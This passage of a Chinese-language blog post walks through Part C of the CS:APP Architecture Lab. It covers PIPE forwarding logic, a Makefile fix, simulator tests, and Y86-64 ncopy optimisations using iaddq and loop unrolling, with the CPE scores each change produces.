class="hljs-string">d_srcB</span> <span class="hljs-string">==</span> <span class="hljs-attr">M_dstE :</span> <span class="hljs-string">M_valE;</span>    <span class="hljs-comment"># Forward valE from memory</span><br><span class="hljs-string">d_srcB</span> <span class="hljs-string">==</span> <span class="hljs-attr">W_dstM :</span> <span class="hljs-string">W_valM;</span>    <span class="hljs-comment"># Forward valM from write back</span><br><span class="hljs-string">d_srcB</span> <span class="hljs-string">==</span> <span class="hljs-attr">W_dstE :</span> <span class="hljs-string">W_valE;</span>    <span class="hljs-comment"># Forward valE from write back</span><br><span class="hljs-attr">1 :</span> <span class="hljs-string">d_rvalB;</span>  <span class="hljs-comment"># Use value read from register file       先考虑上面是否需要转发 如果不涉及转发 则取d_rvalB</span><br>]<span class="hljs-string">;</span><br></code></pre></td></tr></table></figure><h5 id="其他阶段比较简单"><a href="#其他阶段比较简单" class="headerlink" title="其他阶段比较简单"></a>其他阶段比较简单</h5><h4 id="PIPE流水线控制逻辑"><a href="#PIPE流水线控制逻辑" class="headerlink" title="PIPE流水线控制逻辑"></a>PIPE流水线控制逻辑</h4><p>主要是解决下面几个问题：</p><ol><li>加载&#x2F;使用冒险：使用加载互锁解决</li><li>ret：流水线暂停直至ret写回</li><li>处理错误的PC预测（jxx） ：取消错误指令，从正确的位置取指</li><li>异常处理：暂停cnd等程序员可见状态的更新，错误指令写回后，停止执行；期望的结果是，异常指令之前的指令都完成了，异常指令之后的指令不改变程序员可见状态</li></ol><p>&#x3D;&#x3D;上述问题的触发条件，如何设置转发、暂停和bubble&#x3D;&#x3D;</p><h3 id="正式进入PartC"><a href="#正式进入PartC" class="headerlink" title="正式进入PartC"></a>正式进入PartC</h3><p>working directory ：sim&#x2F;pipe</p><p>modify : ncopy.ys &amp; pipe-full.hcl </p><p>purpose: run fast   CPE指的是 复制每个单元需要的时钟周期   eg:   897 cycles to copy 63 elements, for a CPE of 897&#x3D;63 &#x3D; 14:24.  </p><p>测试时，先用pipe简单测试两个driver文件 ；然后用simulator（不是我们的PIPE，而是他们的yis）和更多程序测试ncopy.yo的正确性； 然后测试pipe simulator的正确性</p><h4 id="不改动-测试一下-编译错误"><a href="#不改动-测试一下-编译错误" class="headerlink" title="不改动 测试一下 (编译错误)"></a>不改动 测试一下 (编译错误)</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">thz@DESKTOP-79OKEST:/mnt/d/cs_basci_labs/CSAPP_labs$ cd my_answer/archlab-handout/sim/pipe/<br>thz@DESKTOP-79OKEST:/mnt/d/cs_basci_labs/CSAPP_labs/my_answer/archlab-handout/sim/pipe$ make VERSION=full<br><span class="hljs-meta prompt_"># </span><span class="language-bash">Building the pipe-full.hcl version of PIPE</span><br>../misc/hcl2c -n pipe-full.hcl &lt; pipe-full.hcl &gt; pipe-full.c<br>gcc -Wall -O2 -isystem /usr/include/tcl8.5 -I../misc -DHAS_GUI -o psim psim.c pipe-full.c \<br>        ../misc/isa.c -L/usr/lib -ltk -ltcl -lm<br>psim.c:23:10: fatal error: tk.h: No such file or directory<br>   23 | #include &lt;tk.h&gt;<br>      |          ^~~~~~<br>compilation terminated.<br>make: *** [Makefile:44: psim] Error 1<br></code></pre></td></tr></table></figure><p>对makefile进行修改 <img src="/project/./image/4,arch_lab_image/image-20240519133759844.png" alt="image-20240519133759844"></p><p>注释掉pipe&#x2F;psim的<img src="/project/./image/4,arch_lab_image/image-20240519133826774.png" alt="image-20240519133826774"></p><p>之后编译成功</p><ol><li>先用pipe测试 sdriver.yo和ldriver.yo</li></ol><figure class="highlight node-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs node-repl"><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">  ./psim -t sdriver.<span class="hljs-property">yo</span>                 <span class="hljs-comment">//-t是直接测试 -g是gui模式</span></span><br> <br></code></pre></td></tr></table></figure><p>结果是</p><p><img src="/project/./image/4,arch_lab_image/image-20240519134344032.png" alt="image-20240519134344032"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ISA</span> Check Succeeds<br><span class="hljs-attribute">CPI</span>: <span class="hljs-number">73</span> cycles/<span class="hljs-number">58</span> instructions = <span class="hljs-number">1</span>.<span class="hljs-number">26</span><br></code></pre></td></tr></table></figure><ol start="2"><li>然后用更多程序测试nocopy.yo</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"> &gt; </span><span class="language-bash">../misc/yis sdriver.yo                 //两个小测试</span><br><span class="hljs-meta prompt_"> &gt; </span><span class="language-bash">../misc/yis ldriver.yo</span><br> <br> //更多参数下的测试<br>thz@DESKTOP-79OKEST:/mnt/d/cs_basci_labs/CSAPP_labs/my_answer/archlab-handout/sim/pipe$ ./correctness.pl <br>Simulating with instruction set simulator yis<br>        ncopy<br>0       OK<br>1       OK<br>2       OK<br>3       OK<br>...<br></code></pre></td></tr></table></figure><ol start="3"><li><p>然后测试pipe simulator</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;<span class="hljs-built_in">cd</span> ../y86-code/              <span class="hljs-comment">#对若干程序进行测试</span><br>&gt;make testpsim<br>&gt;<span class="hljs-built_in">cd</span> ../ptest; make SIM=../pipe/psim TFLAGS=-i           //对指令集测试  -i 表示包含iaddq<br><br>thz@DESKTOP-79OKEST:/mnt/d/cs_basci_labs/CSAPP_labs/my_answer/archlab-handout/sim/ptest$ make SIM=../pipe/psim <br>./optest.pl -s ../pipe/psim <br>Simulating with ../pipe/psim<br>  All 49 ISA Checks Succeed<br>./jtest.pl -s ../pipe/psim <br>Simulating with ../pipe/psim<br>  All 64 ISA Checks Succeed<br>./ctest.pl -s ../pipe/psim <br>Simulating with ../pipe/psim<br>  All 22 ISA Checks Succeed<br>./htest.pl -s ../pipe/psim <br>Simulating with ../pipe/psim<br>  All 600 ISA Checks Succeed<br>  <br>&gt; <span class="hljs-built_in">cd</span> ../pipe; ./correctness.pl -p          <span class="hljs-comment">#对ncopy进行若干参数的测试</span><br></code></pre></td></tr></table></figure><p>计算得分 平均CPI</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs swift">thz<span class="hljs-meta">@DESKTOP</span><span class="hljs-operator">-</span>79OKEST:<span class="hljs-regexp">/mnt/</span>d<span class="hljs-regexp">/cs_basci_labs/</span><span class="hljs-type">CSAPP_labs</span><span class="hljs-regexp">/my_answer/</span>archlab<span class="hljs-operator">-</span>handout<span class="hljs-regexp">/sim/</span>pipe$ <span class="hljs-operator">./</span>benchmark.pl <br>        ncopy<br><span class="hljs-number">0</span>       <span class="hljs-number">13</span><br><span class="hljs-operator">...</span><br><span class="hljs-number">64</span>      <span class="hljs-number">913</span>     <span class="hljs-number">14.27</span><br><span class="hljs-type">Average</span> <span class="hljs-type">CPE</span>     <span class="hljs-number">15.18</span><br><span class="hljs-type">Score</span>   <span class="hljs-number">0.0</span><span class="hljs-operator">/</span><span class="hljs-number">60.0</span><br></code></pre></td></tr></table></figure></li></ol><h4 id="开始优化"><a href="#开始优化" class="headerlink" title="开始优化"></a>开始优化</h4><h5 id="实现iaddq"><a href="#实现iaddq" class="headerlink" title="实现iaddq"></a>实现iaddq</h5><p>仿照seq-full.hcl，修改pipi-full.hcl即可</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># 检测pipe正确性</span><br>make psim <span class="hljs-attribute">VERSION</span>=full<br>./psim -t sdriver.yo<br>cd <span class="hljs-built_in">..</span>/ptest/<br>make <span class="hljs-attribute">SIM</span>=../pipe/psim  <br>make <span class="hljs-attribute">SIM</span>=../pipe/psim  <span class="hljs-attribute">TFLAGS</span>=-i<br></code></pre></td></tr></table></figure><p>结果</p><p><img src="/project/./image/4,arch_lab_image/image-20240519163042972.png" alt="image-20240519163042972"></p><h5 id="利用iaddq"><a href="#利用iaddq" class="headerlink" title="利用iaddq"></a>利用iaddq</h5><p>修改ncopy.ys 利用上iaddq</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs clean">######################原代码##############################<br># You can modify this portion<br># Loop header<br>xorq %rax,%rax# count = <span class="hljs-number">0</span>;<br>andq %rdx,%rdx# len &lt;= <span class="hljs-number">0</span>?<br>jle Done# <span class="hljs-keyword">if</span> so, goto Done:<br><br>Loop:<br>mrmovq (%rdi), %r10# read val <span class="hljs-keyword">from</span> src...   此处加载/使用冒险<br>rmmovq %r10, (%rsi)# ...and store it to dst<br>andq %r10, %r10# val &lt;= <span class="hljs-number">0</span>?<br>jle Npos# <span class="hljs-keyword">if</span> so, goto Npos:<br>irmovq $<span class="hljs-number">1</span>, %r10                       #此处可用iaddq<br>addq %r10, %rax# count++<br>Npos:<br>irmovq $<span class="hljs-number">1</span>, %r10        <br>subq %r10, %rdx# len--      加载/使用冒险<br>irmovq $<span class="hljs-number">8</span>, %r10            #加载使用冒险<br>addq %r10, %rdi# src++<br>addq %r10, %rsi# dst++<br>andq %rdx,%rdx# len &gt; <span class="hljs-number">0</span>?<br>jg Loop# <span class="hljs-keyword">if</span> so, goto Loop:<br>##################################################################<br># Do not modify the following section <span class="hljs-keyword">of</span> <span class="hljs-keyword">code</span><br># Function epilogue.<br>Done:<br>ret<br><br></code></pre></td></tr></table></figure><p>利用iaddq并消除加载&#x2F;使用冒险</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs clean">##################################################################<br># You can modify this portion<br># Loop header<br>xorq %rax,%rax# count = <span class="hljs-number">0</span>;<br>andq %rdx,%rdx# len &lt;= <span class="hljs-number">0</span>?<br>jle Done# <span class="hljs-keyword">if</span> so, goto Done:<br>Loop:<br>mrmovq (%rdi), %r10# read val <span class="hljs-keyword">from</span> src...<br>    iaddq $<span class="hljs-number">-1</span>,%rdx# len--      消除加载/使用冒险<br>rmmovq %r10, (%rsi)# ...and store it to dst<br>iaddq $<span class="hljs-number">8</span>, %rdi# src++<br>iaddq $<span class="hljs-number">8</span>, %rsi# dst++<br>andq %r10, %r10# val &lt;= <span class="hljs-number">0</span>?<br>jle Npos# <span class="hljs-keyword">if</span> so, goto Npos:<br>iaddq $<span class="hljs-number">1</span>,%rax<br>Npos:<br>andq %rdx,%rdx# len &gt; <span class="hljs-number">0</span>?<br>jg Loop# <span class="hljs-keyword">if</span> so, goto Loop:<br></code></pre></td></tr></table></figure><p>结果</p><p><img src="/project/./image/4,arch_lab_image/image-20240519164107137.png" alt="image-20240519164107137"></p><h5 id="循环展开"><a href="#循环展开" class="headerlink" title="循环展开"></a>循环展开</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 原代码</span><br><span class="hljs-type">word_t</span> <span class="hljs-title function_">ncopy</span><span class="hljs-params">(<span class="hljs-type">word_t</span> *src, <span class="hljs-type">word_t</span> *dst, <span class="hljs-type">word_t</span> len)</span><br>&#123;<br>    <span class="hljs-type">word_t</span> count = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">word_t</span> val;<br><br>    <span class="hljs-keyword">while</span> (len &gt; <span class="hljs-number">0</span>) &#123;<br>val = *src++;<br>*dst++ = val;<br><span class="hljs-keyword">if</span> (val &gt; <span class="hljs-number">0</span>)<br>    count++;<br>len--;<br>    &#125;<br>    <span class="hljs-keyword">return</span> count;<br>&#125;<br><span class="hljs-comment">// 2x1循环</span><br><span class="hljs-keyword">while</span>(len&gt;=<span class="hljs-number">2</span>)&#123;<br>    val = *src++;<br>*dst++ = val;<br>    <span class="hljs-keyword">if</span> (val &gt; <span class="hljs-number">0</span>)<br>    count++;<br>    val = *src++;<br>*dst++ = val;<br> <span class="hljs-keyword">if</span> (val &gt; <span class="hljs-number">0</span>)<br>    count++;<br>    len-=<span class="hljs-number">2</span>;<br>&#125;<br><span class="hljs-comment">//len&lt;2</span><br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;len;i++)&#123;<br>    val = *src++;<br>*dst++ = val;<br>    <span class="hljs-keyword">if</span> (val &gt; <span class="hljs-number">0</span>)<br>    count++;<br>&#125;<br><span class="hljs-comment">//三路类似</span><br><br></code></pre></td></tr></table></figure><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs perl">//五路展开 ys代码<br><span class="hljs-comment">##################################################################</span><br><span class="hljs-comment"># You can modify this portion</span><br><span class="hljs-comment"># Loop header</span><br>xorq <span class="hljs-variable">%rax</span>,<span class="hljs-variable">%rax</span><span class="hljs-comment"># count = 0;</span><br>andq <span class="hljs-variable">%rdx</span>,<span class="hljs-variable">%rdx</span><span class="hljs-comment"># len &lt;=0 ?</span><br><br>Test1:<br>iaddq <span class="hljs-variable">$-</span><span class="hljs-number">5</span>,<span class="hljs-variable">%rdx</span><span class="hljs-comment"># k路循环展开 是否大于等于k ?</span><br>jge Loop1<br>iaddq <span class="hljs-variable">$5</span>, <span class="hljs-variable">%rdx</span><br>jg Loop           <br>jmp Done       <span class="hljs-comment"># len &lt;=0 ? Done</span><br><br><br>Loop:              <span class="hljs-comment"># len不够k  普通循环</span><br>mrmov<span class="hljs-string">q (<span class="hljs-variable">%rdi</span>)</span>, <span class="hljs-variable">%r10</span><span class="hljs-comment"># read val from src...   </span><br>iaddq <span class="hljs-variable">$8</span>, <span class="hljs-variable">%rdi</span><span class="hljs-comment"># src++</span><br>rmmovq <span class="hljs-variable">%r10</span>, (<span class="hljs-variable">%rsi</span>)<span class="hljs-comment"># ...and store it to dst</span><br>iaddq <span class="hljs-variable">$8</span>, <span class="hljs-variable">%rsi</span><span class="hljs-comment"># dst++</span><br>iaddq <span class="hljs-variable">$-</span><span class="hljs-number">1</span>,<span class="hljs-variable">%rdx</span><br>andq <span class="hljs-variable">%r10</span>, <span class="hljs-variable">%r10</span><span class="hljs-comment"># val &lt;= 0?</span><br>jle RET1<span class="hljs-comment"># if so, goto Npos:</span><br>iaddq <span class="hljs-variable">$1</span>,<span class="hljs-variable">%rax</span><br><br>RET1:<br>andq <span class="hljs-variable">%rdx</span>,<span class="hljs-variable">%rdx</span><span class="hljs-comment"># len &gt; 0?</span><br>jg Loop<span class="hljs-comment"># if so, goto Loop:</span><br>ret<br><br>Loop1:<br>mrmov<span class="hljs-string">q (<span class="hljs-variable">%rdi</span>)</span>, <span class="hljs-variable">%r10</span><span class="hljs-comment"># read val from src...   </span><br>iaddq <span class="hljs-variable">$8</span>, <span class="hljs-variable">%rdi</span><span class="hljs-comment"># src++</span><br>rmmovq <span class="hljs-variable">%r10</span>, (<span class="hljs-variable">%rsi</span>)<span class="hljs-comment"># ...and store it to dst</span><br>iaddq <span class="hljs-variable">$8</span>, <span class="hljs-variable">%rsi</span><span class="hljs-comment"># dst++</span><br>andq <span class="hljs-variable">%r10</span>, <span class="hljs-variable">%r10</span><span class="hljs-comment"># val &lt;= 0?</span><br>jle Loop2<span class="hljs-comment"># if so, goto Npos:</span><br>iaddq <span class="hljs-variable">$1</span>,<span class="hljs-variable">%rax</span><br>Loop2:<br>mrmov<span class="hljs-string">q (<span class="hljs-variable">%rdi</span>)</span>, <span class="hljs-variable">%r10</span><span class="hljs-comment"># read val from src...   </span><br>iaddq <span class="hljs-variable">$8</span>, <span class="hljs-variable">%rdi</span><span class="hljs-comment"># src++</span><br>rmmovq <span class="hljs-variable">%r10</span>, (<span class="hljs-variable">%rsi</span>)<span class="hljs-comment"># ...and store it to dst</span><br>iaddq <span class="hljs-variable">$8</span>, <span class="hljs-variable">%rsi</span><span class="hljs-comment"># dst++</span><br>andq <span class="hljs-variable">%r10</span>, <span class="hljs-variable">%r10</span><span class="hljs-comment"># val &lt;= 0?</span><br>jle Loop3<span class="hljs-comment"># if so, goto Npos:</span><br>iaddq <span class="hljs-variable">$1</span>,<span class="hljs-variable">%rax</span><br>Loop3:<br>mrmov<span class="hljs-string">q (<span class="hljs-variable">%rdi</span>)</span>, <span class="hljs-variable">%r10</span><span class="hljs-comment"># read val from src...   </span><br>iaddq <span class="hljs-variable">$8</span>, <span class="hljs-variable">%rdi</span><span class="hljs-comment"># src++</span><br>rmmovq <span class="hljs-variable">%r10</span>, (<span class="hljs-variable">%rsi</span>)<span class="hljs-comment"># ...and store it to dst</span><br>iaddq <span class="hljs-variable">$8</span>, <span class="hljs-variable">%rsi</span><span class="hljs-comment"># dst++</span><br>andq <span class="hljs-variable">%r10</span>, <span class="hljs-variable">%r10</span><span class="hljs-comment"># val &lt;= 0?</span><br>jle Loop4<span class="hljs-comment"># if so, goto Npos:</span><br>iaddq <span class="hljs-variable">$1</span>,<span class="hljs-variable">%rax</span><br>Loop4:<br>mrmov<span class="hljs-string">q (<span class="hljs-variable">%rdi</span>)</span>, <span class="hljs-variable">%r10</span><span class="hljs-comment"># read val from src...   </span><br>iaddq <span class="hljs-variable">$8</span>, <span class="hljs-variable">%rdi</span><span class="hljs-comment"># src++</span><br>rmmovq <span class="hljs-variable">%r10</span>, (<span class="hljs-variable">%rsi</span>)<span class="hljs-comment"># ...and store it to dst</span><br>iaddq <span class="hljs-variable">$8</span>, <span class="hljs-variable">%rsi</span><span class="hljs-comment"># dst++</span><br>andq <span class="hljs-variable">%r10</span>, <span class="hljs-variable">%r10</span><span class="hljs-comment"># val &lt;= 0?</span><br>jle Loop5<span class="hljs-comment"># if so, goto Npos:</span><br>iaddq <span class="hljs-variable">$1</span>,<span class="hljs-variable">%rax</span><br>Loop5:<br>mrmov<span class="hljs-string">q (<span class="hljs-variable">%rdi</span>)</span>, <span class="hljs-variable">%r10</span><span class="hljs-comment"># read val from src...   </span><br>iaddq <span class="hljs-variable">$8</span>, <span class="hljs-variable">%rdi</span><span class="hljs-comment"># src++</span><br>rmmovq <span class="hljs-variable">%r10</span>, (<span class="hljs-variable">%rsi</span>)<span class="hljs-comment"># ...and store it to dst</span><br>iaddq <span class="hljs-variable">$8</span>, <span class="hljs-variable">%rsi</span><span class="hljs-comment"># dst++</span><br>andq <span class="hljs-variable">%r10</span>, <span class="hljs-variable">%r10</span><span class="hljs-comment"># val &lt;= 0?</span><br>jle Test1<span class="hljs-comment"># if so, goto Npos:</span><br>iaddq <span class="hljs-variable">$1</span>,<span class="hljs-variable">%rax</span><br>jmp Test1<br><br></code></pre></td></tr></table></figure><p>得分情况</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs arcade">五路<br><span class="hljs-built_in">Average</span> CPE     <span class="hljs-number">9.77</span><br>Score   <span class="hljs-number">14.5</span>/<span class="hljs-number">60.0</span><br>六路<br><span class="hljs-built_in">Average</span> CPE     <span class="hljs-number">9.76</span><br>Score   <span class="hljs-number">14.7</span>/<span class="hljs-number">60.0</span><br></code></pre></td></tr></table></figure><h5 id="精简指令"><a href="#精简指令" class="headerlink" title="精简指令"></a>精简指令</h5><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs perl">主要是精简了loop<br>Loop1:<br>mrmov<span class="hljs-string">q (<span class="hljs-variable">%rdi</span>)</span>, <span class="hljs-variable">%r10</span><span class="hljs-comment"># read val from src...   </span><br>rmmovq <span class="hljs-variable">%r10</span>, (<span class="hljs-variable">%rsi</span>)<span class="hljs-comment"># ...and store it to dst</span><br>andq <span class="hljs-variable">%r10</span>, <span class="hljs-variable">%r10</span><span class="hljs-comment"># val &lt;= 0?</span><br>jle Loop2<span class="hljs-comment"># if so, goto Npos:</span><br>iaddq <span class="hljs-variable">$1</span>,<span class="hljs-variable">%rax</span><br>Loop2:<br>mrmovq <span class="hljs-number">8</span>(<span class="hljs-variable">%rdi</span>), <span class="hljs-variable">%r10</span><span class="hljs-comment"># read val from src...   </span><br>rmmovq <span class="hljs-variable">%r10</span>, <span class="hljs-number">8</span>(<span class="hljs-variable">%rsi</span>)<span class="hljs-comment"># ...and store it to dst</span><br>andq <span class="hljs-variable">%r10</span>, <span class="hljs-variable">%r10</span><span class="hljs-comment"># val &lt;= 0?</span><br>jle Loop3<span class="hljs-comment"># if so, goto Npos:</span><br>iaddq <span class="hljs-variable">$1</span>,<span class="hljs-variable">%rax</span><br>Loop3:<br>mrmovq <span class="hljs-number">16</span>(<span class="hljs-variable">%rdi</span>), <span class="hljs-variable">%r10</span><span class="hljs-comment"># read val from src...   </span><br>rmmovq <span class="hljs-variable">%r10</span>, <span class="hljs-number">16</span>(<span class="hljs-variable">%rsi</span>)<span class="hljs-comment"># ...and store it to dst</span><br>andq <span class="hljs-variable">%r10</span>, <span class="hljs-variable">%r10</span><span class="hljs-comment"># val &lt;= 0?</span><br>jle Loop4<span class="hljs-comment"># if so, goto Npos:</span><br>iaddq <span class="hljs-variable">$1</span>,<span class="hljs-variable">%rax</span><br>Loop4:<br>mrmovq <span class="hljs-number">24</span>(<span class="hljs-variable">%rdi</span>), <span class="hljs-variable">%r10</span><span class="hljs-comment"># read val from src...   </span><br>rmmovq <span class="hljs-variable">%r10</span>, <span class="hljs-number">24</span>(<span class="hljs-variable">%rsi</span>)<span class="hljs-comment"># ...and store it to dst</span><br>andq <span class="hljs-variable">%r10</span>, <span class="hljs-variable">%r10</span><span class="hljs-comment"># val &lt;= 0?</span><br>jle Loop5<span class="hljs-comment"># if so, goto Npos:</span><br>iaddq <span class="hljs-variable">$1</span>,<span class="hljs-variable">%rax</span><br>Loop5:<br>mrmovq <span class="hljs-number">32</span>(<span class="hljs-variable">%rdi</span>), <span class="hljs-variable">%r10</span><span class="hljs-comment"># read val from src...   </span><br>rmmovq <span class="hljs-variable">%r10</span>, <span class="hljs-number">32</span>(<span class="hljs-variable">%rsi</span>)<span class="hljs-comment"># ...and store it to dst</span><br>andq <span class="hljs-variable">%r10</span>, <span class="hljs-variable">%r10</span><span class="hljs-comment"># val &lt;= 0?</span><br>jle Loop6<span class="hljs-comment"># if so, goto Npos:</span><br>iaddq <span class="hljs-variable">$1</span>,<span class="hljs-variable">%rax</span><br>Loop6:<br>mrmovq <span class="hljs-number">40</span>(<span class="hljs-variable">%rdi</span>), <span class="hljs-variable">%r10</span><span class="hljs-comment"># read val from src...   </span><br>rmmovq <span class="hljs-variable">%r10</span>, <span class="hljs-number">40</span>(<span class="hljs-variable">%rsi</span>)<span class="hljs-comment"># ...and store it to dst</span><br>iaddq <span class="hljs-variable">$4</span>8,<span class="hljs-variable">%rdi</span><br>iaddq <span class="hljs-variable">$4</span>8,<span class="hljs-variable">%rsi</span><br>andq <span class="hljs-variable">%r10</span>, <span class="hljs-variable">%r10</span><span class="hljs-comment"># val &lt;= 0?</span><br>jle Test1<span class="hljs-comment"># if so, goto Npos:</span><br>iaddq <span class="hljs-variable">$1</span>,<span class="hljs-variable">%rax</span><br>jmp Test1<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Average</span> CPE     <span class="hljs-number">9</span>.<span class="hljs-number">22</span><br><span class="hljs-attribute">Score</span>   <span class="hljs-number">25</span>.<span class="hljs-number">5</span>/<span class="hljs-number">60</span>.<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h5 id="消除气泡"><a href="#消除气泡" class="headerlink" title="消除气泡"></a>消除气泡</h5><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 